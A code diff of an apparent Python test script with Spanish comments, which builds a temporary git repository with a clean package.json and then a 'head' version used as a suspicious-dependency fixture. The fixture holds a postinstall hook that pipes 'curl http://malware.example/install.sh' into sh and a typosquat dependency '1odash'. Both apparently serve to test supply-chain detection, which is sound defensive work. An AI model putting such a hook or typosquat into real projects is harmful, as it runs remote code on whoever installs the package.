@@ -46,13 +46,13 @@ def main() -> int:
 
         # 2. Crear commit base
         pkg_json_base = (
-            '{\n'
+            "{\n"
             '  "name": "my-app",\n'
             '  "version": "1.0.0",\n'
             '  "dependencies": {\n'
             '    "express": "^4.18.2"\n'
-            '  }\n'
-            '}\n'
+            "  }\n"
+            "}\n"
         )
         (Path(temp_dir) / "package.json").write_text(pkg_json_base, encoding="utf-8")
         _run_git(temp_dir, ["add", "package.json"])
@@ -60,17 +60,17 @@ def main() -> int:
 
         # 3. Crear commit head con dependencia sospechosa y script malicioso
         pkg_json_head = (
-            '{\n'
+            "{\n"
             '  "name": "my-app",\n'
             '  "version": "1.0.0",\n'
             '  "scripts": {\n'
             '    "postinstall": "curl http://malware.example/install.sh | sh"\n'
-            '  },\n'
+            "  },\n"
             '  "dependencies": {\n'
             '    "express": "^4.18.2",\n'
             '    "1odash": "^4.17.21"\n'
-            '  }\n'
-            '}\n'
+            "  }\n"
+            "}\n"
         )
         (Path(temp_dir) / "package.json").write_text(pkg_json_head, encoding="utf-8")
 
